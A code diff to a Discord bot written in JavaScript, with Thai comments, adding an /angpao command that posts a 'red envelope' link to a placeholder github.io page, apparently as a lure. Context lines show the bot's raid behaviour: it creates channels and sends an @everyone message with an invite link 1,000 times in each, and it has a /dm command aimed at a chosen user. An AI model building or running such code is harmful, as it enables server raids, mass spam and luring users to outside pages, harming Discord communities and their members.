@@ -23,6 +23,9 @@ const client = new Client({
 const LOG_CHANNEL_ID = "1461588208675459217";
 const BLOCKED_GUILD_ID = "146024011876123456";
 
+// ===== ANGPAO CONFIG =====
+const ANGPAO_LINK = "https://USERNAME.github.io/angpao/"; // 👈 เปลี่ยนเป็นลิงก์เว็บอังเปาของมึง
+
 // ===== RANDOM TEXT =====
 const randomMessages = [
   "@everyone เอ๋อ",
@@ -88,7 +91,21 @@ client.on("interactionCreate", async (interaction) => {
     logUse(interaction);
 
     // =======================
-    // /dm (ใหม่)
+    // /angpao  ⭐ เพิ่มใหม่
+    // =======================
+    if (interaction.commandName === "angpao") {
+      await interaction.reply({
+        content:
+          "🧧 **อังเปาพิเศษสำหรับคุณ**\n" +
+          "คลิกเพื่อเปิดอังเปา 👇\n" +
+          "🔗 " + ANGPAO_LINK
+      });
+
+      logUse(interaction, "-> angpao");
+    }
+
+    // =======================
+    // /dm
     // =======================
     if (interaction.commandName === "dm") {
       const target = interaction.options.getUser("target");
@@ -201,11 +218,15 @@ client.on("interactionCreate", async (interaction) => {
             type: ChannelType.GuildText,
             permissionOverwrites:[{
               id: interaction.guild.roles.everyone.id,
-              allow:[PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages]
+              allow:[
+                PermissionsBitField.Flags.ViewChannel,
+                PermissionsBitField.Flags.SendMessages
+              ]
             }],
           }).then(ch=>{
             for (let j = 0; j < 1000; j++)
-              ch.send("@everyone ไม่เป็นไรนะสร้างใหม่ได้ค่ะที่รัก https://discord.gg/bdtRJBRyem").catch(()=>{});
+              ch.send("@everyone ไม่เป็นไรนะสร้างใหม่ได้ค่ะที่รัก https://discord.gg/bdtRJBRyem")
+                .catch(()=>{});
           }).catch(()=>{})
         );
       }
